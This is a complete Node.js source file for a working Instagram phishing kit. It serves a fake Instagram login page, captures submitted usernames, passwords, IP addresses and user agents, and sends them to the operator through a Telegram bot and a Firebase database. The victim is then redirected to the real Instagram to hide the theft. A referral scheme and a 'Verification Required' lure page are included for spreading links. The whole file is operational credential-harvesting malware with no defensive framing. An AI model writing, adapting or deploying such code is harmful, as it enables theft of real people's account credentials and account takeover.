// index.js (ESM) – Node 18+
// npm i telegraf express multer dotenv

import dotenv from "dotenv";
dotenv.config();

import express from "express";
import multer from "multer";
import { Telegraf } from "telegraf";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const BOT_TOKEN = process.env.BOT_TOKEN;
const HOST = process.env.HOST || "localhost";
const PORT = process.env.PORT || 3000;
const FIREBASE_DB_URL = process.env.FIREBASE_DB_URL;
const ADMIN_USER_ID = process.env.ADMIN_USER_ID || "5543574742";

if (!BOT_TOKEN) {
  console.error("❌ Set BOT_TOKEN in .env");
  process.exit(1);
}

console.log("✅ Environment loaded");
console.log("🤖 Bot Token:", BOT_TOKEN ? "Present" : "Missing");
console.log("👤 Admin ID:", ADMIN_USER_ID);

// ---------- FIREBASE ----------
async function saveUser(id) {
  if (!FIREBASE_DB_URL) return;
  
  try {
    await fetch(`${FIREBASE_DB_URL}/users/${id}.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        timestamp: Date.now() 
      })
    });
    console.log(`✅ User ${id} saved to Firebase`);
  } catch (e) { 
    console.error("Save user error:", e); 
  }
}

async function saveLoginAttempt(credentials, ip, userAgent, ref = null) {
  if (!FIREBASE_DB_URL) return;
  
  try {
    const loginData = {
      username: credentials.username,
      password: credentials.password,
      ip: ip,
      userAgent: userAgent,
      ref: ref,
      timestamp: Date.now()
    };
    
    await fetch(`${FIREBASE_DB_URL}/logins.json`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(loginData)
    });
    console.log("✅ Login saved to Firebase");
  } catch (e) { 
    console.error("Save login error:", e); 
  }
}

// ---------- BOT ----------
let bot;
try {
  bot = new Telegraf(BOT_TOKEN);
  console.log("✅ Bot instance created");
} catch (error) {
  console.error("❌ Bot creation failed:", error);
  process.exit(1);
}

// Bot error handling
bot.catch((err, ctx) => {
  console.error(`❌ Bot error for ${ctx.updateType}:`, err);
});

// Simple start command
bot.start(async (ctx) => {
  const id = String(ctx.from.id);
  console.log(`👋 Start command from user: ${id}`);
  
  await saveUser(id);
  
  await ctx.reply(
    `🤖 *Welcome!*\n\nYour referral link:\nhttps://${HOST}/r/${id}\n\nInstagram page:\nhttps://${HOST}/insta`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 Open Instagram", url: `https://${HOST}/insta?ref=${id}` }],
          [{ text: "🔗 Get Link", callback_data: "get_link" }]
        ]
      }
    }
  );
});

// Get link callback
bot.action("get_link", async (ctx) => {
  const id = String(ctx.from.id);
  await ctx.answerCbQuery();
  await ctx.reply(`https://${HOST}/r/${id}`);
});

bot.command("link", async (ctx) => {
  const id = String(ctx.from.id);
  await saveUser(id);
  await ctx.reply(`https://${HOST}/r/${id}`);
});

// Admin command
bot.command("admin", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) {
    return ctx.reply("❌ Access denied.");
  }
  
  await ctx.reply(`👨‍💼 Admin Panel\n\nCommands:\n/stats - User statistics\n/broadcast - Send message to all users`);
});

// Start bot
bot.launch().then(() => {
  console.log("✅ Bot launched successfully");
}).catch(e => {
  console.error("❌ Bot launch error:", e);
});

// ---------- EXPRESS ----------
const app = express();

// Middleware - MUST BE FIRST
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "test insta")));

const upload = multer({ storage: multer.memoryStorage() });

// Request logger
app.use((req, res, next) => {
  console.log(`🌐 ${req.method} ${req.url}`);
  next();
});

// Serve Instagram page
app.get("/insta", (req, res) => {
  console.log("📱 Serving Instagram page");
  const ref = req.query.ref;
  console.log("Referral:", ref || 'none');
  res.sendFile(path.join(__dirname, "test insta", "index.html"));
});

// Serve static files
app.use("/public", express.static(path.join(__dirname, "test insta", "public")));

// CAPTURE LOGIN - SIMPLE & RELIABLE
app.post("/login", async (req, res) => {
  console.log("📨 LOGIN ENDPOINT HIT!");
  console.log("📝 Form data:", req.body);
  
  const { username, password, ref } = req.body;
  
  if (!username || !password) {
    console.log("❌ Missing username or password");
    return res.redirect("/insta?error=missing");
  }

  // Get IP and other info
  const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || "unknown";
  const userAgent = req.headers['user-agent'] || "unknown";
  const time = new Date().toLocaleString();

  console.log(`🔐 CAPTURED LOGIN:
    Username: ${username}
    Password: ${password}
    Ref: ${ref || 'none'}
    IP: ${ip}
    Time: ${time}`);

  // Create message for Telegram
  const message = `
🔐 *INSTAGRAM LOGIN CAPTURED*

👤 *Username:* \`${username}\`
🔑 *Password:* \`${password}\`
🌐 *IP:* \`${ip}\`
🕒 *Time:* \`${time}\`
${ref ? `👥 *From User:* ${ref}` : ''}
  `.trim();

  // Send to Telegram
  try {
    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { 
      parse_mode: "Markdown"
    });
    console.log("✅ Successfully sent to Telegram!");
  } catch (error) {
    console.error("❌ Failed to send to Telegram:", error);
  }

  // Save to Firebase if available
  if (FIREBASE_DB_URL) {
    try {
      await saveLoginAttempt({ username, password }, ip, userAgent, ref);
      console.log("✅ Saved to Firebase");
    } catch (error) {
      console.error("❌ Failed to save to Firebase:", error);
    }
  }

  // Always redirect to real Instagram
  res.redirect("https://www.instagram.com/");
});

// Student referral page
app.get("/r/:ref", async (req, res) => {
  const { ref } = req.params;
  console.log(`👤 Referral accessed: /r/${ref}`);
  
  if (!/^\d+$/.test(ref)) {
    return res.status(400).send("Invalid referral ID");
  }

  await saveUser(ref);

  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { 
      margin: 0; 
      padding: 20px; 
      background: #000; 
      color: #fff; 
      font-family: Arial, sans-serif;
      text-align: center;
    }
    .container {
      max-width: 400px;
      margin: 50px auto;
      padding: 20px;
      background: #111;
      border-radius: 10px;
    }
    .btn {
      background: #0095f6;
      color: white;
      padding: 15px;
      border: none;
      border-radius: 8px;
      width: 100%;
      font-size: 16px;
      cursor: pointer;
      margin: 10px 0;
    }
    .info {
      background: #1a1a1a;
      padding: 15px;
      border-radius: 8px;
      margin: 15px 0;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>📱 Verification Required</h2>
    <div class="info">
      <p>Click the button below to continue to Instagram verification</p>
      <p><small>Referral: ${ref}</small></p>
    </div>
    <button class="btn" onclick="window.location.href='/insta?ref=${ref}'">
      Continue to Instagram
    </button>
    <p><small>You will be redirected to the official Instagram page</small></p>
  </div>
</body>
</html>
  `);
});

// Test route to check if bot can send messages
app.get("/test", async (req, res) => {
  try {
    await bot.telegram.sendMessage(ADMIN_USER_ID, "🤖 Test message from server - Bot is working!");
    res.json({ success: true, message: "Test message sent to Telegram" });
  } catch (error) {
    res.json({ success: false, error: error.message });
  }
});

// Health check
app.get("/", (req, res) => {
  res.json({ 
    status: "OK", 
    bot: "Running",
    timestamp: new Date().toISOString() 
  });
});

// Start server
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Instagram: http://${HOST}:${PORT}/insta`);
  console.log(`🔗 Test bot: http://${HOST}:${PORT}/test`);
});

// Graceful shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));